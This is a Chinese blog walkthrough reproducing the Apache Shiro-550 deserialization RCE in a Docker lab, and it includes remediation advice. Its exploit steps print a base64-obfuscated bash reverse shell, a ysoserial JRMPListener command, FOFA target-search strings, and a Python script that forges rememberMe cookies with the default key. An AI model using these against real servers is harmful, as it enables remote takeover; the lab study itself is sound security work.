

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="Shiro550、721漏洞复现一、啥是shiroApache shiro 是一个常用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。Shiro提供了应用程序安全性API来执行以下方面：[api框架内置了大量api]1.身份验证：证明用户身份，通常称为用户”登录”；2.授权：访问控制；3.密码术：保护或隐藏数据以防窥视；4.会话管理：每个用户的时间敏感状态。">
<meta property="og:type" content="article">
<meta property="og:title" content="Shiro550、721漏洞复现">
<meta property="og:url" content="http://example.com/2025/02/19/shiro550%E3%80%81721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="ljhflag">
<meta property="og:description" content="Shiro550、721漏洞复现一、啥是shiroApache shiro 是一个常用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。Shiro提供了应用程序安全性API来执行以下方面：[api框架内置了大量api]1.身份验证：证明用户身份，通常称为用户”登录”；2.授权：访问控制；3.密码术：保护或隐藏数据以防窥视；4.会话管理：每个用户的时间敏感状态。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011055660.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011101827.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011615960.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011615806.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503042116716.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503051544327.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503051811205.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071847462.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845580.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845769.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845703.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845760.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845764.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845270.png">
<meta property="article:published_time" content="2025-02-19T14:27:00.000Z">
<meta property="article:modified_time" content="2025-03-27T13:16:03.936Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="CVE复现">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011055660.png">
  
  
  
  <title>Shiro550、721漏洞复现 - ljhflag</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"skSyD5RSTq4kiWeAhMeeY9ib-gzGzoHsz","app_key":"rQPg4V1fSy3hOP8QAyeJnyh8","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Ljhflag</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Shiro550、721漏洞复现"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-02-19 22:27" pubdate>
          2025年2月19日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.3k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          53 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Shiro550、721漏洞复现</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Shiro550、721漏洞复现"><a href="#Shiro550、721漏洞复现" class="headerlink" title="Shiro550、721漏洞复现"></a>Shiro550、721漏洞复现</h1><h2 id="一、啥是shiro"><a href="#一、啥是shiro" class="headerlink" title="一、啥是shiro"></a>一、啥是shiro</h2><p>Apache shiro 是一个常用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。<br>Shiro提供了应用程序安全性API来执行以下方面：[api框架内置了大量api]<br>1.身份验证：证明用户身份，通常称为用户”登录”；<br>2.授权：访问控制；<br>3.密码术：保护或隐藏数据以防窥视；<br>4.会话管理：每个用户的时间敏感状态。</p>
<h3 id="shiro框架可能会出现的场景"><a href="#shiro框架可能会出现的场景" class="headerlink" title="shiro框架可能会出现的场景"></a>shiro框架可能会出现的场景</h3><p>以下是关于 Apache Shiro 框架应用场景的汇总表格</p>
<table>
<thead>
<tr>
<th><strong>应用场景</strong></th>
<th><strong>核心用途</strong></th>
<th><strong>典型场景</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Web 应用的安全管理</strong></td>
<td>• 用户登录认证（如登录框逻辑）<br>• 权限控制（页面&#x2F;操作限制）<br>• 会话管理（防止会话劫持）</td>
<td>• 电商平台（角色区分权限）<br>• OA 系统（部门数据隔离）</td>
</tr>
<tr>
<td><strong>企业级应用的权限控制</strong></td>
<td>• 多角色分层授权（管理员、员工）<br>• 敏感数据加密（如 AES 加密）</td>
<td>• 银行系统（交易记录加密）<br>• 医疗系统（患者隐私保护）</td>
</tr>
<tr>
<td><strong>分布式系统与微服务</strong></td>
<td>• 单点登录（SSO）<br>• 分布式会话管理（如 Redis 共享会话）</td>
<td>• 微服务电商平台（一次登录访问多子系统）</td>
</tr>
<tr>
<td><strong>移动应用与 API 安全</strong></td>
<td>• Token 认证（如 JWT）<br>• API 接口权限控制（限制第三方调用）</td>
<td>• 移动银行 App（交易 API 加密验证）</td>
</tr>
<tr>
<td><strong>轻量级替代方案</strong></td>
<td>• 配置简单，适合中小项目快速集成<br>• 独立性强，无需依赖 Spring 生态</td>
<td>• 初创团队内部管理系统（快速开发）</td>
</tr>
</tbody></table>
<h2 id="二、历史漏洞"><a href="#二、历史漏洞" class="headerlink" title="二、历史漏洞"></a>二、历史漏洞</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Shiro</span> rememberMe反序列化远程代码执行漏洞 Apache Shiro &lt;= <span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">Shiro</span>-<span class="hljs-number">721</span> rememberMe 反序列化远程代码执行漏洞 Apache Shiro &lt;= <span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>Shiro ≤1.2.4 版本中，AES 加密的默认密钥<strong>直接硬编码在 Shiro 框架的 Java 源码中</strong>，例如在 <code>AbstractRememberMeManager</code> 类的初始化代码中</p>
<h2 id="三、漏洞发现"><a href="#三、漏洞发现" class="headerlink" title="三、漏洞发现"></a>三、漏洞发现</h2><h3 id="shiro组件的发现"><a href="#shiro组件的发现" class="headerlink" title="shiro组件的发现"></a>shiro组件的发现</h3><p>在访问及登录时抓包，如果响应头 set-cookie 中显示 rememberMe&#x3D;deleteMe ，说<br>明使用了 Shiro 组件。</p>
<h3 id="shiro漏洞搜索"><a href="#shiro漏洞搜索" class="headerlink" title="shiro漏洞搜索"></a>shiro漏洞搜索</h3><p>通过fofa、zoomeye、shodan这类平台搜索相关特征来发现目标。<br>例如fofa的搜索关键词：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markup">header=&quot;rememberme=deleteMe&quot;<br>header=&quot;shiroCookie&quot;<br></code></pre></td></tr></table></figure>

<h3 id="漏洞检测工具"><a href="#漏洞检测工具" class="headerlink" title="漏洞检测工具"></a>漏洞检测工具</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fupinglee/</span>ShiroScan<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sv3nbeast/</span>ShiroScan<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/insightglacier/</span>Shiro_exploit<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Ares-X/</span>shiro-exploit<br></code></pre></td></tr></table></figure>

<h2 id="四、Shiro-550漏洞原理"><a href="#四、Shiro-550漏洞原理" class="headerlink" title="四、Shiro-550漏洞原理"></a>四、Shiro-550漏洞原理</h2><h3 id="实现原理："><a href="#实现原理：" class="headerlink" title="实现原理："></a>实现原理：</h3><p>Apache Shiro 框架提供了记住密码的功能（ RememberMe ），关闭浏览器再次访问时无需再登录即可访问。这种功能的实现是因为rememberme中存储着用于验证用户的令牌id啥的  </p>
<p>首先要清楚流程：首先用户再次登录同一个网站时浏览器就会发送第一次登陆成功后已经生成的 在cookie中的rememberme的值到服务端然后服务端得到请求的数据包的时候<strong>获取cookie中rememberMe的值 –&gt; Base64解码 –&gt; AES解密 –&gt; 反序列化</strong> 。</p>
<p>我们最终要实现的目的是： 通过利用反序列化实现命令执行所以我们就要让我们所构造的恶意序列化字符串进行<strong>AES加密—&gt;Base64加密—&gt;rememberme的值</strong>想要实现这个过程我们只需要知道<strong>AES密钥</strong>即可完成</p>
<p>用户登录成功后用户信息会经过加密编码后存储在 cookie中。在 Cookie 读取过程中有用 AES 对 Cookie 中的<strong>rememberMe</strong>解密的过程，对于 AES 这类对称加密算法，一旦密钥泄露加密便形同虚设。若秘钥可控，同时cookie中rememberMe的值是由攻击者构造的恶意 Payload ，就可以将流程走通，触发危险的 Java 反序列化，从而导致远程命令执行漏洞</p>
<p><code>像是AES这种的只是需要一个私钥即可完成加解密操作的加密方式就是对称加密 而像是RSA加密的话就是一个非对称加密因为在加密的时候需要使用一个公钥但是想要解密的话是需要一个私钥 这里的公钥和私钥是一对 但是不能仅凭其中一个推导出另一个</code></p>
<p>但是AES加密的密钥Key被<strong>硬编码</strong>在后端框架代码里，这就意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为 cookie 的rememberMe 字段发送。 Shiro 将 rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。</p>
<p><code>只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都可能会导致该漏洞的产生 。</code></p>
<p>如果在返回包的 Set-Cookie 中存在 rememberMe&#x3D;deleteMe 字段，那么就可能存在此漏洞。</p>
<h3 id="Shiro-550漏洞中AES密钥存储位置及文件名特征总结"><a href="#Shiro-550漏洞中AES密钥存储位置及文件名特征总结" class="headerlink" title="Shiro-550漏洞中AES密钥存储位置及文件名特征总结"></a>Shiro-550漏洞中AES密钥存储位置及文件名特征总结</h3><table>
<thead>
<tr>
<th><strong>应用场景</strong></th>
<th><strong>文件名&#x2F;代码特征</strong></th>
<th><strong>风险说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>未修复的Shiro应用</strong></td>
<td>代码文件：<code>DefaultSecurityManager.java</code> 密钥变量名：<code>DEFAULT_CIPHER_KEY_BYTES</code></td>
<td>默认密钥 <code>kPH+bIxk5D2deZiIxcaaaA==</code> 直接暴露，攻击者可构造恶意Cookie</td>
</tr>
<tr>
<td><strong>部分修复的应用</strong></td>
<td>文件名：<code>shiro.ini</code>、<code>config.properties</code> 配置键名：<code>securityManager.cipherKey</code></td>
<td>若未彻底修改默认密钥，仍可能被爆破或泄露</td>
</tr>
<tr>
<td><strong>自定义密钥的应用</strong></td>
<td>无固定文件名 代码中通过 <code>setCipherKey()</code> 方法动态设置密钥</td>
<td>密钥安全性高，但需确保密钥生成、存储、传递过程无漏洞</td>
</tr>
</tbody></table>
<h3 id="关键特征说明"><a href="#关键特征说明" class="headerlink" title="关键特征说明"></a><strong>关键特征说明</strong></h3><ol>
<li><p>默认密钥特征  </p>
<ul>
<li>硬编码值：Base64编码的 <code>kPH+bIxk5D2deZiIxcaaaA==</code>（解码后为16字节AES密钥）。  </li>
<li>代码位置：Shiro框架的 <code>AbstractRememberMeManager</code> 类初始化时直接赋值。</li>
</ul>
</li>
<li><p>配置文件特征  </p>
<ul>
<li>常见路径：<code>/WEB-INF/shiro.ini</code>、<code>src/main/resources/application.properties</code>。  </li>
<li>配置项示例：  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">securityManager.rememberMeManager.cipherKey</span> = 新密钥（Base64编码）<br></code></pre></td></tr></table></figure>
若未修改或使用弱密钥，仍可被爆破工具检测（如ShiroAttack2）。</li>
</ul>
</li>
<li><p>攻击利用特征  </p>
<ul>
<li>Cookie字段：<code>rememberMe=deleteMe</code>（响应头标识Shiro框架）。  </li>
<li>密钥爆破：攻击者利用常见密钥列表（如Shiro默认密钥、常见弱密钥）生成恶意Cookie。</li>
</ul>
</li>
</ol>
<h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><ol>
<li>修复方案：  <ul>
<li>升级到Shiro 1.2.5+，并<strong>强制修改默认密钥</strong>，使用随机生成的强密钥（如 <code>openssl rand -base64 32</code>）。  </li>
<li>禁止将密钥硬编码在代码或配置文件中，优先使用密钥管理系统（KMS）。</li>
</ul>
</li>
<li>检测方法：  <ul>
<li>检查代码中 <code>AbstractRememberMeManager</code> 类是否直接引用 <code>DEFAULT_CIPHER_KEY_BYTES</code>。  </li>
<li>使用工具扫描配置文件是否包含默认密钥或弱密钥。</li>
</ul>
</li>
<li>应急响应：  <ul>
<li>若密钥泄露，需立即轮换密钥并检查日志中异常RememberMe请求。</li>
</ul>
</li>
</ol>
<h3 id="获取shiro密钥的一些方法"><a href="#获取shiro密钥的一些方法" class="headerlink" title="获取shiro密钥的一些方法"></a>获取shiro密钥的一些方法</h3><p>一般就是爆破 （虽然说的是如果版本&lt;&#x3D;1.2.4的时候AES密钥直接硬编码到源码里但是你需要去找github的源码 比较费劲还不如直接爆破 要是爆破不出来的话可以去尝试找找但是不推荐）</p>
<p>另一种方法用于版本&gt;1.2.4的shiro框架 也可以爆但是可能会比较困难因为这个版本以上的shiro框架的AES密钥都是随机生成的</p>
<h3 id="通过脚本爆破密钥的原理"><a href="#通过脚本爆破密钥的原理" class="headerlink" title="通过脚本爆破密钥的原理"></a>通过脚本爆破密钥的原理</h3><p>因为服务端反序列化字符串的流程时获取cookie中rememberMe的值 –&gt; Base64解码 –&gt; AES解密 –&gt; 反序列化而我们构造恶意rememberMe的值的流程是AES加密—&gt;Base64加密—&gt;rememberme的值所以说如果我们在加密的时候所使用的AES的值是正确的那么服务端就能成功解密 如果服务器未返回 <code>deleteMe</code>，说明密钥可能正确  服务器返回 <code>rememberMe=deleteMe</code>，说明密钥错误。</p>
<h2 id="五、Shiro-550漏洞复现"><a href="#五、Shiro-550漏洞复现" class="headerlink" title="五、Shiro-550漏洞复现"></a>五、Shiro-550漏洞复现</h2><h4 id="条件：拿到AES密钥"><a href="#条件：拿到AES密钥" class="headerlink" title="条件：拿到AES密钥"></a>条件：拿到AES密钥</h4><p><strong>1 启动靶场</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">systemctl</span> start docker<br><span class="hljs-attribute">cd</span> shiro/CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">4437</span><br><span class="hljs-attribute">docker</span>-compose up -d<br></code></pre></td></tr></table></figure>

<p>至于具体去哪个端口访问靶场可以去瞅瞅docker-compose.yml里咋配置的</p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011055660.png" srcset="/img/loading.gif" lazyload alt="image-20250301105521532"></p>
<p><strong>2 抓包 注意对于此页面的抓包要在填写了账户密码后点击登录 抓这个包不要抓错包</strong></p>
<p>然后要注意的一点是他的特征是在<code>Set-Cookie:</code>中出现<code>rememberMe=deleteMe</code>而set-cookie是一定存在于响应包里的</p>
<p>如图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011101827.png" srcset="/img/loading.gif" lazyload alt="image-20250301110149776"></p>
<p><strong>3</strong> <strong>然后</strong>因为我们下一步是去利用aes密钥去生成payload所以我们要去通过一些方法<strong>得到他的AES密钥</strong></p>
<p>这里我选择的是去爆破网上有很多脚本和工具去爆破：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011615960.png" srcset="/img/loading.gif" lazyload alt="image-20250301161518735"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011615806.png" srcset="/img/loading.gif" lazyload alt="image-20250301161522402"></p>
<p>然后下一步的思路</p>
<p><strong>4 首先在我的主机上选择一个端口进行监听</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>

<p><strong>5 然后利用一个工具来生成payload</strong></p>
<p>bash转换链接：<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec[%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%B0%86%E4%B8%80%E4%B8%AA%E4%BD%A0%E6%83%B3%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4%E5%85%88%E8%BF%9B%E8%A1%8Cbase64%E7%BC%96%E7%A0%81%E7%84%B6%E5%90%8E%E5%86%8D%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%B7%BB%E5%8A%A0%E5%91%BD%E4%BB%A4%E4%BD%BF%E5%BE%97%E8%BF%99%E4%B8%AA%E7%BB%8F%E8%BF%87base64%E7%BC%96%E7%A0%81%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%8D%E7%84%B6%E5%8F%AF%E4%BB%A5%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%AD%E5%85%88%E8%A2%ABbase64%E8%A7%A3%E7%A0%81%E7%84%B6%E5%90%8E%E8%A2%AB%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C]">https://ares-x.com/tools/runtime-exec[这个网站可以将一个你想要执行的命令先进行base64编码然后再进一步添加命令使得这个经过base64编码的字符串仍然可以在终端中先被base64解码然后被成功执行]</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503042116716.png" srcset="/img/loading.gif" lazyload alt="image-20250304211558578"></p>
<p>可以将<code>bash -i &gt;&amp; /dev/tcp/192.168.129.1/9999 0&gt;&amp;1</code>转换为                                                                                                                   <code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS4xLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code> 其实这是将原来的命令进行了base64编码处理这样可以绕过一些字符检测 </p>
<p><strong><code>bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS4xLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;&quot;|&#123;bash,-i&#125;</code></strong></p>
<p>以上这段代码中的<code>&#123;base64,-d&#125;</code>可以<code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzEuMTYuMS4xMDUvOTk5OSAwPiYx</code>解码为<code>bash -i &gt;&amp; /dev/tcp/171.16.1.105/9999 0&gt;&amp;1</code>  </p>
<p><code>&#123;bash,-i&#125;</code>可以为<code>bash -i &gt;&amp; /dev/tcp/192.168.129.1/9999 0&gt;&amp;1</code>  的执行准备好环境让其成功的执行   至于这段代码的作用是可以反连到指定的服务器上的指定的端口</p>
<p><strong>6 在我的主机上起一个JRMP监听器</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503051544327.png" srcset="/img/loading.gif" lazyload alt="image-20250305154426130"></p>
<p><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections4 &quot;反弹Shell命令&quot;</code></p>
<p>将我们在以上第五步所处理的用于反弹shell的命令填到里面 <code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9988 CommonsCollections4 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS4xLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code></p>
<p>[以上这段代码的作用可以实现当目标主机反序列化后主动向攻击者的指定端口发起RMI通信请求时，以上这段代码会发送 双引号中的内容到被攻击者的服务器]</p>
<p><strong>JRMP监听器（JRMPListener）</strong> 是攻击者在反序列化漏洞中常用的工具组件，用于<strong>构造恶意RMI服务端并等待目标主动连接</strong>，从而实现远程代码执行（RCE）</p>
<p><strong>7 执行shiro550-exp.py脚本生成cookie中的 rememberme</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">command</span>):<br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<span class="hljs-comment">#其中的AES要改成我们所爆破出来的密钥</span><br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])   <br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode())<br><br></code></pre></td></tr></table></figure>

<p>注意其中需要更改的参数</p>
<p>然后python3 shiro550-exp.py 192.168.129.1:9988  [这里的地址是攻击这主机的ip地址端口要和前面的开放JRMP监听器的的端口相对应]</p>
<p> <strong>8 然后通过bp抓包将上个步骤中生成的rememberme加到cookie中</strong></p>
